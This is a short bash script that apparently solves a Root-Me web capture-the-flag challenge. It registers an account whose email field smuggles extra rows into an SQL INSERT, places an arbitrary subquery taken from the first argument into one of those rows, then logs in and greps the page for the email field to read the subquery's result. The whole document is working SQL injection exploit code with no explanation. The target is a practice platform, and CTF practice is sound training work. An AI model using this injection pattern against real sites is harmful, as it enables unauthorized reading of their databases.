url="http://challenge01.root-me.org/web-serveur/ch33/?action=register"
urlb="http://challenge01.root-me.org/web-serveur/ch33/?action=login"

name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)

email="'),('$name', '$name', ($1)), ('"$name"c', 'pass2', '"

post="username="$name"b&password=pass1&email=$email"


curl --data "$post" $url 2> /dev/null | grep "failed"

echo

curl --data "username=$name&password=$name" $urlb 2> /dev/null | grep "Email"
